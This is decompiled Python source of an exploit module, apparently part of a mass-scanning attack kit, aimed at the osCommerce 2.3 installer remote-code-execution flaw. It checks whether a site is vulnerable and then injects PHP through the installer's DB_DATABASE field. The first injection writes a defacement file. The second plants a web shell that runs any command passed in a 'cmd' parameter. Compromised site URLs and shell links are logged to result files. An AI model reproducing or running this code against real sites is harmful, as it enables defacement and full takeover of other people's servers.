# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\osCommerce.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site):
    try:
        CheckVuln = requests.get('http://' + site + '/install/index.php', timeout=10, headers=Headers)
        if 'Welcome to osCommerce' in str(CheckVuln.content) or CheckVuln.status_code == 200:
            Exp = site + '/install/install.php?step=4'
            data = {'DIR_FS_DOCUMENT_ROOT': './'
               }
            pay = "');?><?php echo 'Vuln!!';{}{}{} ?><?//".format('system(', '$_GET', "['cmd']);")
            shell = '{}'.format(pay)
            deface = "');"
            deface += 'system("echo Vuln!! patch it Now!> ../../vuln.htm");'
            deface += '/*'
            data['DB_DATABASE'] = deface
            r = requests.post(url='http://' + Exp, data=data, timeout=10, headers=Headers)
            if r.status_code == 200:
                requests.get('http://' + site + '/install/includes/configure.php', timeout=10, headers=Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=10, headers=Headers)
                if 'Vuln!!' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.txt' + '\n')
                    try:
                        data['DB_DATABASE'] = shell
                        requests.post(url='http://' + Exp, data=data, timeout=10, headers=Headers)
                        requests.get('http://' + site + '/install/includes/configure.php', timeout=10, headers=Headers)
                        requests.get('http://' + site + '/install/includes/OsComPayLoad.php', timeout=10, headers=Headers)
                        Checkshell = requests.get('http://' + site + '/install/includes/vuln.php', timeout=10, headers=Headers)
                        if 'Vuln!!' in str(Checkshell.content):
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + '/install/includes/vuln.php?cmd=pwd' + '\n')
                        return printModule.returnYes(site, 'N/A', 'osCommerce RCE 2.3', 'osCommerce')
                    except:
                        return printModule.returnYes(site, 'N/A', 'osCommerce RCE 2.3', 'osCommerce')

                else:
                    return printModule.returnNo(site, 'N/A', 'osCommerce RCE 2.3', 'osCommerce')
            else:
                return printModule.returnNo(site, 'N/A', 'osCommerce RCE 2.3', 'osCommerce')
        else:
            return printModule.returnNo(site, 'N/A', 'osCommerce RCE 2.3', 'osCommerce')
    except:
        return printModule.returnNo(site, 'N/A', 'osCommerce RCE 2.3', 'osCommerce')